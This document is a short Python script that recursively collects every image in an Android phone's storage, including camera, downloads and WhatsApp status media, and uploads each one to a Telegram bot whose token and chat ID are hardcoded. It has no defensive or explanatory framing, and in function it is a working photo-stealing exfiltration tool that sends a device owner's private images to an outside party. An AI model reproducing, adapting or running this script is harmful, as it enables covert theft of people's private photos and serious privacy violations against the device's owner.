import os
import requests
from glob import glob
import time
from PIL import Image

TOKEN = '8019634294:AAE8TRGISBGxHHNrh4TyctpBOYmPRzu1b54'
CHAT_ID = '6423238949'

image_extensions = ["*.jpg", "*.jpeg", "*.png", "*.webp"]
folders = ["/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download", "/sdcard/WhatsApp/Media/.Statuses", "/sdcard/"]

MAX_SIZE_MB = 19  # File size limit for Telegram in MB

def is_valid_image(path):
    try:
        if os.path.getsize(path) > MAX_SIZE_MB * 1024 * 1024:
            return False
        with Image.open(path) as img:
            img.verify()
        return True
    except:
        return False

def collect_images():
    image_paths = []
    for folder in folders:
        for ext in image_extensions:
            found = glob(os.path.join(folder, "**", ext), recursive=True)
            image_paths.extend(found)
    valid_images = [img for img in image_paths if is_valid_image(img)]
    return sorted(list(set(valid_images)))

def send_photo(photo_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            response = requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
            if response.status_code == 200:
                print(f"[+] Sent: {photo_path}")
            else:
                print(f"[-] Failed: {photo_path} ({response.status_code})")
    except Exception as e:
        print(f"[!] Error sending {photo_path}: {e}")

def main():
    print("[*] Collecting valid images...")
    images = collect_images()
    print(f"[*] Found {len(images)} valid images.")
    for img in images:
        send_photo(img)
        time.sleep(1.5)

if __name__ == "__main__":
    main()